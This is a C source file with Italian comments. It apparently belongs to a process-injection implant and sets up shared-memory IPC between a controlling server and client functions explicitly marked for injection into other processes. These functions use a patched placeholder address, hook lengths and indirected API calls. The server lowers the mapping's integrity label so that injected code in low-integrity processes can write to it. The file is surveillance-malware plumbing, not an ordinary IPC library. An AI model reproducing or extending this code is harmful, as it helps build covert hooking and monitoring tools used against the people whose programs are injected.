#include "exceptions.h"
#include <Sddl.h>

// La memoria per la lettura e' composta da una serie di strutture che il server scrive e tutti i client
// possono leggere. La memoria per la scrittura implementa una coda di messaggi in cui i client scrivono
// e da cui il server legge.
// I client scrivono message_struct e leggono BYTE che poi loro casteranno.

// Valori base (modificabili a seconda delle esigenze)
#define MAX_MSG_LEN 0x400 // Lunghezza di un messaggio
#define MAX_MSG_NUM 3000 // Massimo numero di messaggi in coda
#define SHARE_MEMORY_READ_SIZE (WRAPPER_COUNT*WRAPPER_MAX_SHARED_MEM) // Dimensione spazio per la lettura delle configurazioni da parte dei wrapper                                
extern char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
extern char SHARE_MEMORY_WRITE_NAME[MAX_RAND_NAME];

// Valori derivati
#define SHARE_MEMORY_WRITE_SIZE ((MAX_MSG_NUM * sizeof(message_struct))+2)


// Macro di supporto
#define DATA_SUPPORT DWORD dwFuncLen; DWORD dwFuncAdd; DWORD dwDataAdd;
typedef struct { DATA_SUPPORT; } Generic_data_support;
#define INIT_SFUNC(STRTYPE)			STRTYPE *pData; \
									__asm    MOV EBX,69696969h \
									__asm	 MOV DWORD PTR SS:[pData], EBX \

#define MMCPY(DST, SRC, SIZ)		{ BYTE *lsrc = (BYTE *)SRC; \
									  BYTE *ldst = (BYTE *)DST; \
									  DWORD lsiz = (DWORD)SIZ; \
									__asm MOV ESI, lsrc \
									__asm MOV EDI, ldst \
									__asm MOV ECX, lsiz \
									__asm REP MOVSB }


// Struttura di un messaggio scritto dai client
// Il corpo del messaggio DEVE essere sempre l'ultimo elemento (vedi IPCServerRead)
// XXX Se modifico va cabiato anche in AM_Core
typedef struct {
	BYTE status; 
#define STATUS_FREE 0 // Libero
#define STATUS_BUSY 1 // In scrittura
#define STATUS_WRIT 2 // Scritto
	FILETIME time_stamp;
	DWORD wrapper_tag;
	DWORD message_len;
	DWORD flags;
	DWORD priority;
#define IPC_LOW_PRIORITY 0x0
#define IPC_DEF_PRIORITY 0x10
#define IPC_HI_PRIORITY  0x100
	BYTE message[MAX_MSG_LEN];
} message_struct;

extern BOOL IsVista(DWORD *integrity_level);
void *FindTokenObject(HANDLE Handle);

void *IPC_SHM_Kernel_Object = NULL;

//-------------------- FUNZIONI DA INIETTARE (Client) ----------------------
//////////////////////////
//						//
//    IPCClientRead     //
//						//
//////////////////////////
typedef struct {
	COMMONDATA;
	BYTE *mem_addr;
} IPCClientRead_data_struct;

IPCClientRead_data_struct IPCClientRead_data;


// Ritorna l'indirizzo di memoria della configurazione di un dato wrapper
// Torna NULL se fallisce
static BYTE * __stdcall IPCClientRead(DWORD wrapper_tag)
{
	INIT_SFUNC(IPCClientRead_data_struct);
	if (!pData->mem_addr) 
		return NULL;
	
	return (pData->mem_addr + wrapper_tag);
}

static DWORD IPCClientRead_setup(DWORD dummy)
{
	HANDLE h_file = FNC(OpenFileMappingA)(FILE_MAP_READ, FALSE, SHARE_MEMORY_READ_NAME);
	IPCClientRead_data.mem_addr = 0;

	// Se non riesce ad aprire l'oggetto setta mem_addr a NULL e la funzione ritornera' sempre NULL
	// Chi la richiama dovra' controllare che il valore di ritorno sia diverso da NULL prima di leggere
	// dalla memoria
	if (h_file)
		IPCClientRead_data.mem_addr = (BYTE *)FNC(MapViewOfFile)(h_file, FILE_MAP_READ, 0, 0, SHARE_MEMORY_READ_SIZE);
	
	IPCClientRead_data.dwHookLen = 150; 
	return 0;
}



//////////////////////////
//						//
//    IPCClientWrite    //
//						//
//////////////////////////
typedef void (WINAPI *GetSystemTimeAsFileTime_t) (LPFILETIME);
typedef struct {
	COMMONDATA;
	message_struct *mem_addr;
	GetSystemTimeAsFileTime_t pGetSystemTimeAsFileTime;
	DWORD increment;
	DWORD old_low_part;
	DWORD old_hi_part;
} IPCClientWrite_data_struct;

IPCClientWrite_data_struct IPCClientWrite_data;

// Torna TRUE se ha scritto, FALSE se fallisce
static BOOL __stdcall IPCClientWrite(DWORD wrapper_tag, BYTE *message, DWORD msg_len, DWORD flags, DWORD priority)
{
	unsigned int i, j;
	message_struct *pMessage;
	FILETIME time_stamp;
	INIT_SFUNC(IPCClientWrite_data_struct);
	// Fallisce se la memoria non e' presente o se il messaggio e' troppo grosso
	// per essere scritto
	if (!pData->mem_addr || msg_len > MAX_MSG_LEN || !message) 
		return FALSE;
	
	// La prima volta cerca una posizione libera.
	// Se non la trova, cerca una posizione occupata da una
	// priorita' minore
	for (j=0; j<2; j++) {
		for (i=0, pMessage=pData->mem_addr; i<MAX_MSG_NUM; i++, pMessage++) {
			if (pMessage->status == STATUS_FREE || (j && pMessage->status == STATUS_WRIT && pMessage->priority < priority)) {
				// XXX Possibilita' di remota race condition sulla lettura dello status
				pMessage->status = STATUS_BUSY;
				pMessage->message_len = msg_len;
				pMessage->priority = priority;
				pMessage->wrapper_tag = wrapper_tag;
				pMessage->flags = flags;

				// Setta il time stamp
				if (pData->pGetSystemTimeAsFileTime) {
					pData->pGetSystemTimeAsFileTime(&time_stamp);

					// Gestisce il caso di due log dello stesso tipo con timestamp uguali
					if (time_stamp.dwLowDateTime != pData->old_low_part ||
						time_stamp.dwHighDateTime != pData->old_hi_part) {
						pData->old_low_part = time_stamp.dwLowDateTime;
						pData->old_hi_part = time_stamp.dwHighDateTime;
						pData->increment = 0;
						pMessage->time_stamp.dwHighDateTime = time_stamp.dwHighDateTime;
						pMessage->time_stamp.dwLowDateTime = time_stamp.dwLowDateTime;
					} else {
						pData->increment++;
						pMessage->time_stamp.dwHighDateTime = time_stamp.dwHighDateTime;
						pMessage->time_stamp.dwLowDateTime = time_stamp.dwLowDateTime + pData->increment;
						// se c'e' riporto
						if (pMessage->time_stamp.dwLowDateTime < time_stamp.dwLowDateTime)
							pMessage->time_stamp.dwHighDateTime++;
					}


				} else {
					pMessage->time_stamp.dwHighDateTime = 0;
					pMessage->time_stamp.dwLowDateTime = 0;
				}

				TRY_BLOCK
					MMCPY(pMessage->message, message, msg_len);
				TRY_EXCEPT
					pMessage->status = STATUS_FREE;
				TRY_END

				if (pMessage->status == STATUS_BUSY)
					pMessage->status = STATUS_WRIT;
				return TRUE;
			}
		}
	}

	// Se arriva qui, la coda e' DAVVERO piena e il messaggio viene droppato
	return FALSE;
}

static DWORD IPCClientWrite_setup(DWORD dummy)
{
	HMODULE h_krn;
	HANDLE h_file;

	h_krn = GetModuleHandle("kernel32.dll");
	IPCClientWrite_data.pGetSystemTimeAsFileTime = (GetSystemTimeAsFileTime_t)HM_SafeGetProcAddress(h_krn, "GetSystemTimeAsFileTime");

	h_file = FNC(OpenFileMappingA)(FILE_MAP_ALL_ACCESS, FALSE, SHARE_MEMORY_WRITE_NAME);
	IPCClientWrite_data.mem_addr = 0;
	IPCClientWrite_data.old_low_part = 0;
	IPCClientWrite_data.old_hi_part = 0;
	IPCClientWrite_data.increment = 0;

	// Se non riesce ad aprire l'oggetto setta mem_addr a NULL e la funzione ritornera' sempre NULL
	// Chi la richiama dovra' controllare che il valore di ritorno sia diverso da NULL prima di leggere
	// dalla memoria
	if (h_file)
		IPCClientWrite_data.mem_addr = (message_struct *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);
	
	IPCClientWrite_data.dwHookLen = 800;
	return 0;
}


//-------------------- FUNZIONI per il Server ----------------------
message_struct *server_mem_addr_read = NULL;
BYTE *server_mem_addr_write = NULL;

void IPCServerWrite(DWORD wrapper_tag, BYTE *buff, DWORD size)
{
	if (server_mem_addr_write)
		memcpy(server_mem_addr_write + wrapper_tag, buff, size);
}


// Torna TRUE se ha letto qualcosa. Non e' bloccante
// XXX Non piu' usata e non aggiornata con garanzia di ordinamento
/*BOOL IPCServerRead(message_struct *serv_buff) 
{
	unsigned int i;
	message_struct *pMessage;

	if (!server_mem_addr_read)
		return FALSE;
	
	for (i=0, pMessage=server_mem_addr_read; i<MAX_MSG_NUM; i++, pMessage++) 
		if (pMessage->status == STATUS_WRIT) {
			// Assumendo che il coprpo del messaggio sia alla fine, copia soltanto il pezzo di messaggio
			// valorizzato (header del messaggio + msg_len)
			// Il check che msg_len sia minore di MAX_MSG_LEN viene fatto dalla funzione
			memcpy(serv_buff, pMessage, sizeof(message_struct) - MAX_MSG_LEN + pMessage->message_len);
			pMessage->status = STATUS_FREE;
			return TRUE;
		}
	
	// Non ci sono elementi da leggere
	return FALSE;

}*/


// Ritorna TRUE se tm1 e' piu' vecchio di tm2
BOOL is_older(FILETIME *tm1, FILETIME *tm2)
{
	if (tm1->dwHighDateTime < tm2->dwHighDateTime)
		return TRUE;
	if (tm1->dwHighDateTime > tm2->dwHighDateTime)
		return FALSE;
	if (tm1->dwLowDateTime < tm2->dwLowDateTime)
		return TRUE;
	return FALSE;
}

// Piu' veloce della Read, ritorna direttamente il messaggio nella shared memory (non fa la memcpy)
// Ma necessita che poi il messaggio sia rimosso a mano dopo che e' stato completato il dispatch
// Garantiesce l'ordinamento
message_struct *IPCServerPeek() 
{
	unsigned int i;
	message_struct *pMessage, *oldest_msg = NULL;
	FILETIME oldest_time;

	if (!server_mem_addr_read)
		return NULL;

	// Setta il tempo del piu' vecchio al massimo possibile
	// cosi' il primo verra' preso
	oldest_time.dwHighDateTime = 0xFFFFFFFF;
	oldest_time.dwLowDateTime = 0xFFFFFFFF;
	for (i=0, pMessage=server_mem_addr_read; i<MAX_MSG_NUM; i++, pMessage++)  {
		if (pMessage->status == STATUS_WRIT && is_older(&(pMessage->time_stamp), &oldest_time)) {
			oldest_msg = pMessage;
			oldest_time.dwHighDateTime = pMessage->time_stamp.dwHighDateTime;
			oldest_time.dwLowDateTime = pMessage->time_stamp.dwLowDateTime;
		}
	}

	// Ritrorna il messaggio piu' vecchio 
	// (NULL se non ce ne sono)
	return oldest_msg;
}


// Rimuove dalla coda un messaggio preso con IPCServerPeek
void IPCServerRemove(message_struct *msg) 
{
	msg->status = STATUS_FREE;
}

// Se la shared memory gia' esiste ritorna FALSE
BOOL IPCServerInit() 
{
	HANDLE h_file;
	SECURITY_ATTRIBUTES sec_attr;
	SECURITY_ATTRIBUTES *act_sec_attr = NULL;
	SECURITY_DESCRIPTOR sec_desc;
	PSECURITY_DESCRIPTOR pSD = NULL;
	DWORD dummy;
    PACL pSacl = NULL;                 
    BOOL fSaclPresent = FALSE;
    BOOL fSaclDefaulted = FALSE;
	BOOL ret_val = TRUE;
    
	do {
		if (!IsVista(&dummy))
			break;
		if (!FNC(InitializeSecurityDescriptor)(&sec_desc, SECURITY_DESCRIPTOR_REVISION))
			break;
		if (!FNC(SetSecurityDescriptorDacl)(&sec_desc, TRUE, NULL, FALSE)) 
			break;
		if (!FNC(ConvertStringSecurityDescriptorToSecurityDescriptorA)("S:(ML;;NW;;;LW)", SDDL_REVISION_1, &pSD, NULL))
			break;
		if (!FNC(GetSecurityDescriptorSacl)(pSD, &fSaclPresent, &pSacl, &fSaclDefaulted))
			break;
		if (!FNC(SetSecurityDescriptorSacl)(&sec_desc, TRUE, pSacl, FALSE))
			break;
		sec_attr.nLength = sizeof(SECURITY_ATTRIBUTES);
		sec_attr.bInheritHandle = FALSE;
		sec_attr.lpSecurityDescriptor = &sec_desc;
		act_sec_attr = &sec_attr;
	} while(0);

	// WRITE e READ sono invertiti perche' vengono visti dall'ottica del client
	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_READ_SIZE, SHARE_MEMORY_READ_NAME);
	if (h_file) {
		server_mem_addr_write = (BYTE *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_READ_SIZE);
		IPC_SHM_Kernel_Object = FindTokenObject(h_file);
	}

	h_file = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, act_sec_attr, PAGE_READWRITE, 0, SHARE_MEMORY_WRITE_SIZE, SHARE_MEMORY_WRITE_NAME);
	if (h_file) {
		if (GetLastError()==ERROR_ALREADY_EXISTS)
			ret_val = FALSE;
		server_mem_addr_read = (message_struct *)FNC(MapViewOfFile)(h_file, FILE_MAP_ALL_ACCESS, 0, 0, SHARE_MEMORY_WRITE_SIZE);
	}

	// Se esisteva gia' non ci deve scrivere
	if (ret_val) {
		if (server_mem_addr_read)
			memset(server_mem_addr_read, 0, SHARE_MEMORY_WRITE_SIZE);
		if (server_mem_addr_write)
			memset(server_mem_addr_write, 0, SHARE_MEMORY_READ_SIZE);
	}

	LocalFree(pSD);
	return ret_val;
}


